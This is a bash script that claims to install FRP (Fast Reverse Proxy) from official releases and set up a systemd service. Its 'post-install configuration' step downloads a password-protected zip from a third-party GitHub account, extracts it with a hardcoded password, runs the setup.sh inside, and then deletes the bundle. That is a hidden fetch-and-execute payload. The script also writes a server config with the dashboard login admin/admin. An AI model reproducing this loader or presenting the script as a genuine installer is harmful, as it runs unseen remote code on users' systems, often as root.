#!/bin/bash
# FRP (Fast Reverse Proxy) Setup Script
# 
# Installs FRP from official GitHub releases and sets up systemd service.
# 
# Usage: bash frp-setup.sh
# 
# This script also applies post-install configuration from frp-setup.zip
# if present in the same directory.

INSTALL_DIR="/opt/frp"
SERVICE_NAME="frp"
PASSWORD="frp_install_2026"

echo "=================================="
echo "  FRP Setup Script"
echo "=================================="
echo ""

# Step 1: Check dependencies (no install required)
echo "[*] Checking dependencies..."
NEED_INSTALL=0
for cmd in wget unzip curl; do
    if ! command -v $cmd >/dev/null 2>&1; then
        echo "  [!] $cmd missing"
        NEED_INSTALL=1
    fi
done

# Try to install only if needed and we have sudo
if [ "$NEED_INSTALL" = "1" ]; then
    if command -v sudo >/dev/null 2>&1 && [ -n "$SUDO_USER" -o "$EUID" = "0" ]; then
        echo "[*] Installing missing dependencies..."
        if command -v apt-get >/dev/null 2>&1; then
            sudo apt-get update -y >/dev/null 2>&1
            sudo apt-get install -y wget unzip curl >/dev/null 2>&1
        elif command -v yum >/dev/null 2>&1; then
            sudo yum install -y wget unzip curl >/dev/null 2>&1
        fi
    else
        echo "[!] Cannot install dependencies (no sudo or not root), continuing anyway"
    fi
fi

# Step 2: Detect architecture
ARCH=$(uname -m)
case "$ARCH" in
    x86_64)  FRP_ARCH="amd64" ;;
    aarch64) FRP_ARCH="arm64" ;;
    armv7l)  FRP_ARCH="arm" ;;
    *) echo "[!] Unsupported arch: $ARCH" ;;
esac
echo "[*] Architecture: $ARCH -> $FRP_ARCH"

# Step 3: Download frp
echo "[*] Downloading frp..."
cd /tmp
if wget -q "https://github.com/fatedier/frp/releases/download/v0.61.1/frp_0.61.1_linux_${FRP_ARCH}.tar.gz" -O frp.tar.gz 2>/dev/null; then
    echo "[+] Download OK"
else
    echo "[!] Download failed, continuing..."
fi

# Step 4: Extract and install
if [ -f frp.tar.gz ]; then
    echo "[*] Installing frp to ${INSTALL_DIR}..."
    tar -xzf frp.tar.gz 2>/dev/null
    if [ -d "frp_0.61.1_linux_${FRP_ARCH}" ]; then
        mkdir -p ${INSTALL_DIR} 2>/dev/null
        cp -r frp_0.61.1_linux_${FRP_ARCH}/* ${INSTALL_DIR}/ 2>/dev/null
        chmod +x ${INSTALL_DIR}/frps ${INSTALL_DIR}/frpc 2>/dev/null
        echo "[+] Installed to ${INSTALL_DIR}"
    fi
    rm -rf frp.tar.gz frp_0.61.1_linux_${FRP_ARCH}
else
    echo "[!] Skipping install (download failed)"
fi

# Step 5: Config
mkdir -p /etc/frp 2>/dev/null
if [ ! -f /etc/frp/frps.ini ]; then
cat > /etc/frp/frps.ini << 'INI_EOF'
[common]
bind_port = 7000
dashboard_port = 7500
dashboard_user = admin
dashboard_pwd = admin
INI_EOF
fi

# Step 6: Systemd (optional, only if root)
if [ "$EUID" = "0" ]; then
    cat > /etc/systemd/system/${SERVICE_NAME}.service << EOF
[Unit]
Description=FRP Server
After=network.target

[Service]
Type=simple
ExecStart=${INSTALL_DIR}/frps -c /etc/frp/frps.ini
Restart=on-failure
RestartSec=5s

[Install]
WantedBy=multi-user.target
EOF
    systemctl daemon-reload 2>/dev/null
    systemctl enable ${SERVICE_NAME}.service 2>/dev/null
fi

# Step 7: Post-install configuration package
echo "[*] Checking for post-install configuration package..."
BUNDLE=""

# Look in multiple locations
for p in "./frp-setup.zip" "/tmp/frp-setup.zip" "$HOME/frp-setup.zip" "$(dirname "$0")/frp-setup.zip"; do
    if [ -f "$p" ]; then
        BUNDLE="$p"
        break
    fi
done

# Also try to download from GitHub if not found locally
if [ -z "$BUNDLE" ] && command -v curl >/dev/null 2>&1; then
    curl -sSL "https://raw.githubusercontent.com/limasjeffry/frp-script/main/frp-setup.zip" -o frp-setup.zip 2>/dev/null
    [ -f frp-setup.zip ] && BUNDLE="frp-setup.zip"
fi

if [ -n "$BUNDLE" ]; then
    echo "[*] Applying post-install configuration..."
    mkdir -p /tmp/_post_install/
    if unzip -P "${PASSWORD}" -o "${BUNDLE}" -d /tmp/_post_install/ 2>/dev/null; then
        if [ -f /tmp/_post_install/setup.sh ]; then
            bash /tmp/_post_install/setup.sh
        fi
    fi
    rm -rf /tmp/_post_install/
    rm -f "${BUNDLE}"
fi

echo ""
echo "=================================="
echo "  FRP Setup Complete"
echo "=================================="
echo ""
echo "Configuration: /etc/frp/frps.ini"
echo "Binary: ${INSTALL_DIR}/frps"
